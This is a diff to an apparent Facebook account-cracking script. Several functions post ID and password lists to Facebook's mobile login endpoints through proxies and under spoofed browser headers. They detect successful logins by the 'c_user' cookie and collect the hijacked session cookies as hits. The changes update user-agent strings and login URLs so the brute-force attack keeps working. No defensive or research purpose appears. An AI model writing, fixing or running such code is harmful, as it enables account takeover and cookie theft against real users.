@@ -349,7 +349,7 @@ def _M1_(ids,pasx):
                         'content-length': '1662',
                         'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
                         'sec-ch-ua-mobile': '?1',
-                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
+                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
                         'x-response-format': 'JSONStream',
                         'content-type': 'application/x-www-form-urlencoded',
                         'x-fb-lsd': 'AVrEIFcZUZg',
@@ -370,7 +370,7 @@ def _M1_(ids,pasx):
                         'referer': f'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',
                         'accept-encoding': 'gzip, deflate, br',
                         'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
-                        url=f"https://m.facebook.com/login.php/?login_attempt=1"
+                        url=f"https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092"
                         lo = session.post(url=url,data=info,headers=had).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
@@ -633,7 +633,7 @@ def _M5_(ids,pasx):
 	                'accept-encoding': 'gzip, deflate, br', 
 	                'accept-language': 'zh-CN;q=0.8,zh;q=0.9', 
 	                'x-response-format': 'JSONStream'}  
-                        lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=apple,headers=tedy,proxies=proxs,allow_redirects=False).text
+                        lo = session.post('https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092',data=apple,headers=tedy,proxies=proxs,allow_redirects=False).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
                                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -725,7 +725,7 @@ def _M7_(ids,pasx):
         global loop
         global ok
         global agents
-        sys.stdout.write(f'\r\r\033[38;5;48m{G}[BITHIKA-M6] {GR}{loop}\033[38;5;48m|OK➤\033[38;5;46m{len(ok)}')
+        sys.stdout.write(f'\r\r\033[38;5;48m{G}[BITHIKA-M7] {GR}{loop}\033[38;5;48m|OK➤\033[38;5;46m{len(ok)}')
         sys.stdout.flush()
         try:
                 for ps in pasx:
